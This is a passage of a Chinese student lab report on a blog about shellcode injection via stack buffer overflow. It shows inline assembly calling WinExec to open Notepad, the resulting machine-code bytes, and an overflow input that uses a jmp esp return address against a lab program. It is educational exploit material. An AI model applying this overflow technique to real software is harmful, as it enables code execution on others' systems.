+</ul>
+</li>
+<li><p>运行程序，结果为</p>
+<ul>
+<li><img src="https://gitee.com/reus09/typora/raw/master/img/20211115202132.png"></li>
+<li>可以看到标题被改为<code>软件安全</code></li>
+</ul>
+</li>
+</ul>
+<h2 id="0x04-实验结论"><a href="#0x04-实验结论" class="headerlink" title="0x04 实验结论"></a>0x04 实验结论</h2><ul>
+<li><code>shellcode</code>是利用特定漏洞的二进制代码，利用缓冲区溢出等原理达到获取权限的目的。本次实验通过查找并计算所需函数的入口地址，得到一段汇编语言写的<code>shellcode</code>代码，并通过淹没静态地址和利用跳板的方法两种方法成功进行了<code>shellcode</code>代码注入，更深一步了解了函数跳转的原理，同时也明白了<code>shellcode</code>代码植入的危害性。实验过程中发现如果shellcode的地址含有空(<code>\0</code>)，<code>shellcode</code>会被截断。其中修改原理图示如下:<ul>
+<li><img src="https://gitee.com/reus09/typora/raw/master/img/20211115202326.png" alt="1565848011587"></li>
+</ul>
+</li>
+</ul>
+<h2 id="0x05-附加题"><a href="#0x05-附加题" class="headerlink" title="0x05 附加题"></a>0x05 附加题</h2><ul>
+<li><p>在不修改<code>StackOverrun</code>程序源代码的情况下，构造<code>shellcode</code>，通过<code>jmp esp</code>的方式实现通过记事本打开<code>shellcode.txt</code>（可使用<code>CreateProcessA</code>或<code>WinExec</code>等<code>API</code>）</p>
+</li>
+<li><p>我们这里选择调用函数<code>winExec</code></p>
+</li>
+<li><p>使用<code>OllyDbg</code>查找程序<code>StackOverrun.exe</code>中的<code>jmp esp</code>的地址，选取其中一个：<code>0x77E2E32A</code>，将其作为返回地址进行修改。</p>
+<ul>
+<li><img src="https://gitee.com/reus09/typora/raw/master/img/20211112212309.png" alt="image-20211112212309621"></li>
+</ul>
+</li>
+<li><p><code>winexec 结构</code></p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">UINT <span class="title">WinExec</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in] LPCSTR lpCmdLine,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in] UINT   uCmdShow</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>lpCmdLine：指向一个空结束的字符串，串中包含将要执行的应用程序的命令行（文件名加上可选参数）。</li>
+<li>uCmdShow：定义Windows应用程序的窗口如何显示，并为CreateProcess函数提供STARTUPINFO参数的wShowWindow成员的值。</li>
+<li>因此我们输入构造<code>winexec(&quot;notepad shellcode.txt&quot;,5)</code>即可实现打开当前目录的<code>shellcode.txt</code>文件夹。</li>
+</ul>
+</li>
+<li><p>执行<code>shellcode</code>,然后执行程序打开当前目录下的<code>shellcode.txt</code>文件</p>
+<ul>
+<li><p>我们首先编写如下<code>shellcode</code></p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	HINSTANCE LibHandle;</span><br><span class="line">	<span class="comment">//char dllbuf[11] = &quot;kernel32.dll&quot;;</span></span><br><span class="line">	<span class="comment">//LibHandle = LoadLibrary(dllbuf);</span></span><br><span class="line">	_asm&#123;</span><br><span class="line">		push    ebp;</span><br><span class="line">        mov        ebp, esp;</span><br><span class="line">		<span class="keyword">xor</span> ebx,ebx;</span><br><span class="line">		push ebx;</span><br><span class="line">		sub esp, <span class="number">20</span>h;</span><br><span class="line"></span><br><span class="line">        mov byte ptr[ebp - <span class="number">19</span>h], <span class="number">0x6e</span>;</span><br><span class="line">		mov byte ptr[ebp - <span class="number">18</span>h], <span class="number">0x6f</span>;</span><br><span class="line">		mov byte ptr[ebp - <span class="number">17</span>h], <span class="number">0x74</span>;</span><br><span class="line">		mov byte ptr[ebp - <span class="number">16</span>h], <span class="number">0x65</span>;</span><br><span class="line">		mov byte ptr[ebp - <span class="number">15</span>h], <span class="number">0x70</span>;</span><br><span class="line">		mov byte ptr[ebp - <span class="number">14</span>h], <span class="number">0x61</span>;</span><br><span class="line">		mov byte ptr[ebp - <span class="number">13</span>h], <span class="number">0x64</span>;</span><br><span class="line">		mov byte ptr[ebp - <span class="number">12</span>h], <span class="number">0x20</span>;</span><br><span class="line">		mov byte ptr[ebp - <span class="number">11</span>h], <span class="number">0x73</span>;</span><br><span class="line">		mov byte ptr[ebp - <span class="number">10</span>h], <span class="number">0x68</span>;</span><br><span class="line">		mov byte ptr[ebp - <span class="number">0F</span>h], <span class="number">0x65</span>;</span><br><span class="line">		mov byte ptr[ebp - <span class="number">0</span>Eh], <span class="number">0x6c</span>;</span><br><span class="line">		mov byte ptr[ebp - <span class="number">0</span>Dh], <span class="number">0x6c</span>;</span><br><span class="line">		mov byte ptr[ebp - <span class="number">0</span>Ch], <span class="number">0x63</span>;</span><br><span class="line">		mov byte ptr[ebp - <span class="number">0B</span>h], <span class="number">0x6f</span>;</span><br><span class="line">		mov byte ptr[ebp - <span class="number">0</span>Ah], <span class="number">0x64</span>;</span><br><span class="line">		mov byte ptr[ebp - <span class="number">09</span>h], <span class="number">0x65</span>;</span><br><span class="line">		mov byte ptr[ebp - <span class="number">08</span>h], <span class="number">0x2e</span>;</span><br><span class="line">		mov byte ptr[ebp - <span class="number">07</span>h], <span class="number">0x74</span>;</span><br><span class="line">		mov byte ptr[ebp - <span class="number">06</span>h], <span class="number">0x78</span>;</span><br><span class="line">		mov byte ptr[ebp - <span class="number">05</span>h], <span class="number">0x74</span>;</span><br><span class="line">		</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">		push <span class="number">5</span>;</span><br><span class="line">        lea eax, [ebp - <span class="number">19</span>h];</span><br><span class="line">		push eax;</span><br><span class="line"></span><br><span class="line">		mov eax,<span class="number">0x77e78601</span>;	<span class="comment">//winExec  入口地址</span></span><br><span class="line">		call eax;</span><br><span class="line">        push eax; </span><br><span class="line"></span><br><span class="line">		mov esp, ebp;</span><br><span class="line">        pop    ebp;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
+<li><p><img src="https://gitee.com/reus09/typora/raw/master/img/20211115203029.png" alt="image-20211115203029274"></p>
+</li>
+<li><p>利用<code>Depend.exe</code>找到<code>winexec</code>的函数地址，为<code>0x77r60000</code> + <code>0x18601</code> ，即上方的<code>0x77e78601</code></p>
+</li>
+<li><p>然后利用<code>mov byte ptr[ebp - 19h], 0x6e;</code></p>
+<ul>
+<li>分别将<code>notepad shellcode.txt</code>的每个字符输入到栈中</li>
+<li>然后将字符串的首地址<code>[ebp - 19h]</code>赋值给<code>eax</code>，</li>
+<li>最后<code>eax</code>作为<code>winexec</code>的参数压入栈中</li>
+</ul>
+</li>
+<li><p>将程序编译执行，我们可以打开当前目录下的<code>shellcode.txt</code></p>
+<ul>
+<li><img src="https://gitee.com/reus09/typora/raw/master/img/20211115203805.png" alt="image-20211115203805396"></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>因此我们将此时的<code>shellcode</code>转化为机器码</p>
+<ul>
+<li><p><img src="https://gitee.com/reus09/typora/raw/master/img/20211115203930.png" alt="image-20211115203930143"></p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">55</span> <span class="number">8B</span> EC <span class="number">33</span> DB <span class="number">53</span> <span class="number">83</span> EC <span class="number">20</span> C6 <span class="number">45</span> E7 <span class="number">6</span>E C6 <span class="number">45</span> E8 <span class="number">6F</span> C6 <span class="number">45</span> E9 <span class="number">74</span> C6 <span class="number">45</span> EA <span class="number">65</span> C6 <span class="number">45</span> EB <span class="number">70</span> C6 <span class="number">45</span> EC <span class="number">61</span> C6 <span class="number">45</span> ED <span class="number">64</span> C6 <span class="number">45</span> EE <span class="number">20</span> C6 <span class="number">45</span> EF <span class="number">73</span> C6 <span class="number">45</span> F0 <span class="number">68</span> C6 <span class="number">45</span> F1 <span class="number">65</span> C6 <span class="number">45</span> F2 <span class="number">6</span>C C6 <span class="number">45</span> F3 <span class="number">6</span>C C6 <span class="number">45</span> F4 <span class="number">63</span> C6 <span class="number">45</span> F5 <span class="number">6F</span> C6 <span class="number">45</span> F6 <span class="number">64</span> C6 <span class="number">45</span> F7 <span class="number">65</span> C6 <span class="number">45</span> F8 <span class="number">2</span>E C6 <span class="number">45</span> F9 <span class="number">74</span> C6 <span class="number">45</span> FA <span class="number">78</span> C6 <span class="number">45</span> FB <span class="number">74</span> <span class="number">6</span>A <span class="number">05</span> <span class="number">8</span>D <span class="number">45</span> E7 <span class="number">50</span> B8 <span class="number">01</span> <span class="number">86</span> E7 <span class="number">77</span> FF D0</span><br></pre></td></tr></table></figure></li>
+</ul>
+</li>
+<li><p>根据IDA_Pro查看<code>overflowrun.exe</code>中数组的栈空间</p>
+<ul>
+<li><p><img src="https://gitee.com/reus09/typora/raw/master/img/20211115204205.png" alt="image-20211115204204964"></p>
+</li>
+<li><p>可以看到我们需要填充<code>0x0c</code>个字节才可以覆盖到返回地址</p>
+</li>
+</ul>
+</li>
+<li><p>所以我们的<code>shellcode</code>编写即为:</p>
+<ul>
+<li><code>0x0c</code> * <code>&#39;a&#39;</code> + <code>jmp esp</code> + <code>shellcode </code> + 若干<code>0x90</code></li>
+<li>在<code>010editor</code>里面编写<code>shellcode</code><ul>
+<li><img src="https://gitee.com/reus09/typora/raw/master/img/20211115204425.png" alt="image-20211115204425707"></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>将该<code>shellcode.txt</code>复制到程序同一目录下</p>
+<ul>
+<li><p>在命令行运行程序</p>
+<ul>
+<li><p>因为命令行中空格会默认分割成两个参数，我们的<code>shellcode</code>中含有空格，因此作为参数输入的时候在字符串两端加上<code>&quot;&quot;</code>可以来认为是一个参数</p>
+</li>
+<li><p><img src="https://gitee.com/reus09/typora/raw/master/img/20211115204755.png" alt="image-20211115204755636"></p>
+</li>
+</ul>
+</li>
+<li><p>终端执行程序，我们顺利打开<code>shellcode.txt</code></p>
+</li>
+</ul>
+</li>
+</ul>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">reus09</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://reus09.github.io/2022/01/01/shellcode%E6%B3%A8%E5%85%A5/">https://reus09.github.io/2022/01/01/shellcode%E6%B3%A8%E5%85%A5/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://reus09.github.io" target="_blank">reus</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/shellcode%E6%B3%A8%E5%85%A5/">shellcode注入</a></div><div class="post_share"><div class="social-share" data-image="https://pic.3gbizhi.com/2021/0923/20210923091817189.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2022/01/01/fuzz/"><img class="prev-cover" src="https://pic.3gbizhi.com/2021/0920/20210920090421797.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">fuzz</div></div></a></div><div class="next-post pull-right"><a href="/2022/01/01/%E8%99%9A%E5%87%BD%E6%95%B0/"><img class="next-cover" src="https://pic.3gbizhi.com/2021/0920/20210920090434150.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">虚函数攻击</div></div></a></div></nav><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://gitee.com/reus09/typora/raw/master/img/20211103151005.jpeg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">reus09</div><div class="author-info__description">无名之辈</div></div><div class="card-info-data is-center"><div class="card-info-data-item"><a href="/archives/"><div class="headline">文章</div><div class="length-num">20</div></a></div><div class="card-info-data-item"><a href="/tags/"><div class="headline">标签</div><div class="length-num">18</div></a></div><div class="card-info-data-item"><a href="/categories/"><div class="headline">分类</div><div class="length-num">5</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/reus09"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/reus09" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:614768006@qq.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">足球世界瞬息万变，多特蒙德永不沉沦。</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E7%AC%AC%E4%B8%89%E6%AC%A1%E5%AE%9E%E9%AA%8C"><span class="toc-number">1.</span> <span class="toc-text">软件安全第三次实验</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-%E5%AE%9E%E9%AA%8C%E7%9B%AE%E7%9A%84"><span class="toc-number">1.1.</span> <span class="toc-text">0x01 实验目的</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-%E7%A8%8B%E5%BA%8F%E7%90%86%E8%A7%A3"><span class="toc-number">1.2.</span> <span class="toc-text">0x02 程序理解</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2-1-shellcode%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86"><span class="toc-number">1.2.1.</span> <span class="toc-text">2.1 shellcode注入原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-2-%E7%A8%8B%E5%BA%8F%E7%90%86%E8%A7%A3"><span class="toc-number">1.2.2.</span> <span class="toc-text">2.2 程序理解</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#2-2-1-%E5%BC%B9%E5%87%BAshellcode%E7%9A%84%E6%B1%87%E7%BC%96%E7%90%86%E8%A7%A3"><span class="toc-number">1.2.2.1.</span> <span class="toc-text">2.2.1 弹出shellcode的汇编理解</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-2-2-overflow-exe%E5%88%86%E6%9E%90"><span class="toc-number">1.2.2.2.</span> <span class="toc-text">2.2.2 overflow_exe分析</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-%E5%AE%9E%E9%AA%8C%E5%86%85%E5%AE%B9"><span class="toc-number">1.3.</span> <span class="toc-text">0x03 实验内容</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#3-1-%E6%B7%B9%E6%B2%A1%E9%9D%99%E6%80%81%E5%9C%B0%E5%9D%80%E5%AE%9E%E7%8E%B0shellcode%E6%A4%8D%E5%85%A5"><span class="toc-number">1.3.1.</span> <span class="toc-text">3.1 淹没静态地址实现shellcode植入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-2-%E8%B7%B3%E6%9D%BF%E5%AE%9E%E7%8E%B0shellcode%E7%9A%84%E4%BB%A3%E7%A0%81%E6%A4%8D%E5%85%A5"><span class="toc-number">1.3.2.</span> <span class="toc-text">3.2 跳板实现shellcode的代码植入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-3-%E4%BF%AE%E6%94%B9%E6%B1%87%E7%BC%96%E8%AF%AD%E5%8F%A5%E6%9D%A5%E5%AE%9E%E7%8E%B0%E4%BF%AE%E6%94%B9%E6%A0%87%E9%A2%98"><span class="toc-number">1.3.3.</span> <span class="toc-text">3.3 修改汇编语句来实现修改标题</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-%E5%AE%9E%E9%AA%8C%E7%BB%93%E8%AE%BA"><span class="toc-number">1.4.</span> <span class="toc-text">0x04 实验结论</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-%E9%99%84%E5%8A%A0%E9%A2%98"><span class="toc-number">1.5.</span> <span class="toc-text">0x05 附加题</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2022/01/01/vpn%E9%85%8D%E7%BD%AE/" title="vpn"><img src="https://pic.3gbizhi.com/2021/1103/20211103043551775.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="vpn"/></a><div class="content"><a class="title" href="/2022/01/01/vpn%E9%85%8D%E7%BD%AE/" title="vpn">vpn</a><time datetime="2022-01-01T13:22:48.000Z" title="发表于 2022-01-01 21:22:48">2022-01-01</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/01/01/web%E5%AE%89%E5%85%A8/" title="web安全"><img src="https://pic.3gbizhi.com/2021/1006/20211006101110273.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="web安全"/></a><div class="content"><a class="title" href="/2022/01/01/web%E5%AE%89%E5%85%A8/" title="web安全">web安全</a><time datetime="2022-01-01T13:22:48.000Z" title="发表于 2022-01-01 21:22:48">2022-01-01</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/01/01/%E5%85%A5%E4%BE%B5%E7%9B%91%E6%B5%8B/" title="入侵检测"><img src="https://pic.3gbizhi.com/2021/1105/20211105063648584.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="入侵检测"/></a><div class="content"><a class="title" href="/2022/01/01/%E5%85%A5%E4%BE%B5%E7%9B%91%E6%B5%8B/" title="入侵检测">入侵检测</a><time datetime="2022-01-01T13:22:48.000Z" title="发表于 2022-01-01 21:22:48">2022-01-01</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/01/01/%E7%BD%91%E7%BB%9C%E6%89%AB%E6%8F%8F/" title="网络扫描"><img src="https://pic.3gbizhi.com/2021/1105/20211105063640562.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="网络扫描"/></a><div class="content"><a class="title" href="/2022/01/01/%E7%BD%91%E7%BB%9C%E6%89%AB%E6%8F%8F/" title="网络扫描">网络扫描</a><time datetime="2022-01-01T13:22:48.000Z" title="发表于 2022-01-01 21:22:48">2022-01-01</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/01/01/%E9%98%B2%E7%81%AB%E5%A2%99/" title="防火墙"><img src="https://pic.3gbizhi.com/2021/1105/20211105063644204.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="防火墙"/></a><div class="content"><a class="title" href="/2022/01/01/%E9%98%B2%E7%81%AB%E5%A2%99/" title="防火墙">防火墙</a><time datetime="2022-01-01T13:22:48.000Z" title="发表于 2022-01-01 21:22:48">2022-01-01</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2022 By reus09</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">Hi, welcome to my <a target="_blank" rel="noopener" href="https://butterfly.js.org/">blog</a>!</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">简</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">本地搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.js"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"><script>function loadValine () {
+  function initValine () {
+    const valine = new Valine(Object.assign({
+      el: '#vcomment',
+      appId: 'u4B9afmQbCTKovVFlCeTXMdK-gzGzoHsz',
+      appKey: 'cbGngWbakC2XACAWTmkCGaE9',
+      avatar: 'monsterid',
+      serverURLs: '',
+      emojiMaps: {"tv_doge":"6ea59c827c414b4a2955fe79e0f6fd3dcd515e24.png","tv_親親":"a8111ad55953ef5e3be3327ef94eb4a39d535d06.png","tv_偷笑":"bb690d4107620f1c15cff29509db529a73aee261.png","tv_再見":"180129b8ea851044ce71caf55cc8ce44bd4a4fc8.png","tv_冷漠":"b9cbc755c2b3ee43be07ca13de84e5b699a3f101.png","tv_發怒":"34ba3cd204d5b05fec70ce08fa9fa0dd612409ff.png","tv_發財":"34db290afd2963723c6eb3c4560667db7253a21a.png","tv_可愛":"9e55fd9b500ac4b96613539f1ce2f9499e314ed9.png","tv_吐血":"09dd16a7aa59b77baa1155d47484409624470c77.png","tv_呆":"fe1179ebaa191569b0d31cecafe7a2cd1c951c9d.png","tv_嘔吐":"9f996894a39e282ccf5e66856af49483f81870f3.png","tv_困":"241ee304e44c0af029adceb294399391e4737ef2.png","tv_壞笑":"1f0b87f731a671079842116e0991c91c2c88645a.png","tv_大佬":"093c1e2c490161aca397afc45573c877cdead616.png","tv_大哭":"23269aeb35f99daee28dda129676f6e9ea87934f.png","tv_委屈":"d04dba7b5465779e9755d2ab6f0a897b9b33bb77.png","tv_害羞":"a37683fb5642fa3ddfc7f4e5525fd13e42a2bdb1.png","tv_尷尬":"7cfa62dafc59798a3d3fb262d421eeeff166cfa4.png","tv_微笑":"70dc5c7b56f93eb61bddba11e28fb1d18fddcd4c.png","tv_思考":"90cf159733e558137ed20aa04d09964436f618a1.png","tv_驚嚇":"0d15c7e2ee58e935adc6a7193ee042388adc22af.png"},
+      path: window.location.pathname,
+      visitor: false
+    }, null))
+  }
+
+  if (typeof Valine === 'function') initValine() 
+  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
+}
+
+if ('Valine' === 'Valine' || !true) {
+  if (true) btf.loadComment(document.getElementById('vcomment'),loadValine)
+  else setTimeout(loadValine, 0)
+} else {
+  function loadOtherComment () {
+    loadValine()
+  }
+}</script></div><script src="https://cdn.jsdelivr.net/npm/blueimp-md5@2.17.0/js/md5.min.js"></script><script>window.addEventListener('load', () => {
+  const changeContent = (content) => {
+    if (content === '') return content
+
+    content = content.replace(/<img.*?src="(.*?)"?[^\>]+>/ig, '[图片]') // replace image link
+    content = content.replace(/<a[^>]+?href=["']?([^"']+)["']?[^>]*>([^<]+)<\/a>/gi, '[链接]') // replace url
+    content = content.replace(/<pre><code>.*?<\/pre>/gi, '[代码]') // replace code
+    content = content.replace(/<[^>]+>/g,"") // remove html tag
+
+    if (content.length > 150) {
+      content = content.substring(0,150) + '...'
+    }
+    return content
+  }
+
+  const getIcon = (icon, mail) => {
+    if (icon) return icon
+    let defaultIcon = '?d=monsterid'
+    let iconUrl = `https://gravatar.loli.net/avatar/${md5(mail.toLowerCase()) + defaultIcon}`
+    return iconUrl
+  }
+
+  const generateHtml = array => {
+    let result = ''
+
+    if (array.length) {
+      for (let i = 0; i < array.length; i++) {
+        result += '<div class=\'aside-list-item\'>'
+
+        if (true) {
+          const name = 'src'
+          result += `<a href='${array[i].url}' class='thumbnail'><img ${name}='${array[i].avatar}' alt='${array[i].nick}'></a>`
+        }
+
+        result += `<div class='content'>
+        <a class='comment' href='${array[i].url}'>${array[i].content}</a>
+        <div class='name'><span>${array[i].nick} / </span><time datetime="${array[i].date}">${btf.diffDate(array[i].date, true)}</time></div>
+        </div></div>`
+      }
+    } else {
+      result += '没有评论'
+    }
+
+    let $dom = document.querySelector('#card-newest-comments .aside-list')
+    $dom.innerHTML= result
+    window.lazyLoadInstance && window.lazyLoadInstance.update()
+    window.pjax && window.pjax.refresh($dom)
+  }
+
+  const getComment = () => {
+    const serverURL = 'https://u4B9afmQ.api.lncldglobal.com'
+
+    var settings = {
+      "method": "GET",
+      "headers": {
+        "X-LC-Id": 'u4B9afmQbCTKovVFlCeTXMdK-gzGzoHsz',
+        "X-LC-Key": 'cbGngWbakC2XACAWTmkCGaE9',
+        "Content-Type": "application/json"
+      },
+    }
+
+    fetch(`${serverURL}/1.1/classes/Comment?limit=6&order=-createdAt`,settings)
+      .then(response => response.json())
+      .then(data => {
+        const valineArray = data.results.map(function (e) {
+          return {
+            'avatar': getIcon(e.QQAvatar, e.mail),
+            'content': changeContent(e.comment),
+            'nick': e.nick,
+            'url': e.url + '#' + e.objectId,
+            'date': e.updatedAt,
+          }
+        })
+        saveToLocal.set('valine-newest-comments', JSON.stringify(valineArray), 10/(60*24))
+        generateHtml(valineArray)
+      }).catch(e => {
+        const $dom = document.querySelector('#card-newest-comments .aside-list')
+        $dom.innerHTML= "无法获取评论，请确认相关配置是否正确"
+      }) 
+  }
+
+  const newestCommentInit = () => {
+    if (document.querySelector('#card-newest-comments .aside-list')) {
+      const data = saveToLocal.get('valine-newest-comments')
+      if (data) {
+        generateHtml(JSON.parse(data))
+      } else {
+        getComment()
+      }
+    }
+  }
+
+  newestCommentInit()
+  document.addEventListener('pjax:complete', newestCommentInit)
+})</script><div class="aplayer no-destroy" data-id="806728741" data-server="netease" data-type="playlist" data-fixed="true" data-mini="true" data-listFolded="false" data-order="random" data-preload="auto" data-autoplay="true" muted></div><canvas class="fireworks" mobile="true"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/fireworks.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = true;
+POWERMODE.mobile = false;
+document.body.addEventListener('input', POWERMODE);
+</script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/gh/metowolf/MetingJS@1.2/dist/Meting.min.js"></script><script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script><script>let pjaxSelectors = [
+  'title',
+  '#config-diff',
+  '#body-wrap',
+  '#rightside-config-hide',
+  '#rightside-config-show',
+  '.js-pjax'
+]
+
+if (false) {
+  pjaxSelectors.unshift('meta[property="og:image"]', 'meta[property="og:title"]', 'meta[property="og:url"]')
+}
+
+var pjax = new Pjax({
+  elements: 'a:not([target="_blank"])',
+  selectors: pjaxSelectors,
+  cacheBust: false,
+  analytics: false,
+  scrollRestoration: false
+})
+
+document.addEventListener('pjax:send', function () {
+
+  // removeEventListener scroll 
+  window.removeEventListener('scroll', window.tocScrollFn)
+  window.removeEventListener('scroll', scrollCollect)
+
+  typeof preloader === 'object' && preloader.initLoading()
+  
+  if (window.aplayers) {
+    for (let i = 0; i < window.aplayers.length; i++) {
+      if (!window.aplayers[i].options.fixed) {
+        window.aplayers[i].destroy()
+      }
+    }
+  }
+
+  typeof typed === 'object' && typed.destroy()
+
+  //reset readmode
+  const $bodyClassList = document.body.classList
+  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
+
+})
+
+document.addEventListener('pjax:complete', function () {
+  window.refreshFn()
+
+  document.querySelectorAll('script[data-pjax]').forEach(item => {
+    const newScript = document.createElement('script')
+    const content = item.text || item.textContent || item.innerHTML || ""
+    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+    newScript.appendChild(document.createTextNode(content))
+    item.parentNode.replaceChild(newScript, item)
+  })
+
+  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()
+
+  typeof chatBtnFn === 'function' && chatBtnFn()
+  typeof panguInit === 'function' && panguInit()
+
+  // google analytics
+  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});
+
+  // baidu analytics
+  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);
+
